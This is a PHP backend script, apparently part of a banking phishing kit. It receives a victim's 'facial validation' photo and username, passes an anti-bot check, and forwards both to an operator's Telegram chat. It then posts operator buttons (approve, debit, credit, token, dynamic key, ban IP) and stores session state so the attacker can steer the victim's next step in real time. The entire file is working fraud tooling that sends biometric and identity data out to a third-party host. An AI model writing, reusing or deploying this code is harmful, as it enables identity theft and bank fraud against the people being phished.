<?php
/**
 * ================================================================
 * API Face — Envía foto de validación facial a Telegram
 * ================================================================
 */

require_once __DIR__ . '/../Antibot.php';

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Método no permitido']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

if (!Antibot::esHumano($input)) {
    Antibot::rechazar();
}

$sessionId = $input['sessionId'] ?? '';
$imageData = $input['image'] ?? ''; // base64 data URL
$caption   = $input['caption'] ?? '';

// Extraer usuario del caption para incluirlo en el mensaje de botones
$user = 'Desconocido';
if (preg_match('/Usuario: <code>([^<]+)<\/code>/', $caption, $m)) {
    $user = $m[1];
}

if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
    echo json_encode(['ok' => false, 'error' => 'SessionId inválido']);
    exit;
}

if (empty($imageData) || !str_starts_with($imageData, 'data:image')) {
    echo json_encode(['ok' => false, 'error' => 'Imagen inválida']);
    exit;
}

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];

// Decodificar base64
$parts = explode(',', $imageData);
$base64Data = $parts[1] ?? '';
$mimeInfo = $parts[0] ?? 'data:image/jpeg';

// Detectar extensión
$ext = 'jpg';
if (str_contains($mimeInfo, 'png')) $ext = 'png';
elseif (str_contains($mimeInfo, 'gif')) $ext = 'gif';
elseif (str_contains($mimeInfo, 'webp')) $ext = 'webp';

$tmpFile = tempnam(sys_get_temp_dir(), 'face_') . '.' . $ext;
file_put_contents($tmpFile, base64_decode($base64Data));

// Enviar foto a Telegram
$post = [
    'chat_id' => $chatId,
    'caption' => $caption,
    'parse_mode' => 'HTML'
];

$curlFile = new CURLFile($tmpFile, 'image/' . $ext, 'face_' . $sessionId . '.' . $ext);
$post['photo'] = $curlFile;

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $post,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 30,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_FOLLOWLOCATION => true
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error    = curl_error($ch);
curl_close($ch);

// Limpiar temp
@unlink($tmpFile);

if ($error || $httpCode !== 200) {
    echo json_encode(['ok' => false, 'error' => 'Error Telegram', 'details' => $error ?: "HTTP {$httpCode}"]);
    exit;
}

$data = json_decode($response, true);
if (!$data['ok']) {
    echo json_encode(['ok' => false, 'error' => 'Telegram API error', 'details' => $data['description'] ?? 'Unknown']);
    exit;
}

$messageId = $data['result']['message_id'] ?? null;

// Enviar botones con TODAS las acciones disponibles (igual que send.php)
$buttons = [
    ['text' => '✅ Aprobar',   'callback_data' => "aprobar_face_{$sessionId}"],
    ['text' => '💳 Débito',    'callback_data' => "debito_face_{$sessionId}"],
    ['text' => '💰 Crédito',   'callback_data' => "credito_face_{$sessionId}"],
    ['text' => '🔐 Token',     'callback_data' => "token_face_{$sessionId}"],
    ['text' => '💳 Dinámica',  'callback_data' => "dinamica_face_{$sessionId}"],
    ['text' => '⚠️ 923',       'callback_data' => "923_face_{$sessionId}"],
    ['text' => '🚫 Ban IP',    'callback_data' => "banip_face_{$sessionId}"],
    ['text' => '❌ Rechazar',  'callback_data' => "rechazar_face_{$sessionId}"]
];

$keyboard = [$buttons];

$postData = http_build_query([
    'chat_id'      => $chatId,
    'text'         => "⏳ <b>Esperando acción...</b>\n\n👤 Usuario: <code>{$user}</code>\n📸 Paso: Validación facial",
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
]);

$ch2 = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt_array($ch2, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $postData,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_SSL_VERIFYPEER => true
]);
$resp2 = curl_exec($ch2);
curl_close($ch2);

$msg2 = json_decode($resp2, true);
$msgId2 = $msg2['result']['message_id'] ?? null;

// Guardar sesión para este paso face
$sessionFile = __DIR__ . "/../data/{$sessionId}.json";
$sessData = [];
if (file_exists($sessionFile)) {
    $sessData = json_decode(file_get_contents($sessionFile), true) ?: [];
}

$sessData['currentStep'] = 'face';
$sessData['status']      = 'pending';
$sessData['action']      = null;
$sessData['messageId']   = $msgId2;        // ID del mensaje de texto con botones (para editar)
$sessData['messageText'] = "⏳ <b>Esperando acción...</b>\n\n👤 Usuario: <code>{$user}</code>\n📸 Paso: Validación facial";
$sessData['facePhotoMessageId'] = $messageId; // ID de la foto enviada

file_put_contents($sessionFile, json_encode($sessData), LOCK_EX);

echo json_encode([
    'ok'        => true,
    'messageId' => $messageId,
    'sessionId' => $sessionId
]);
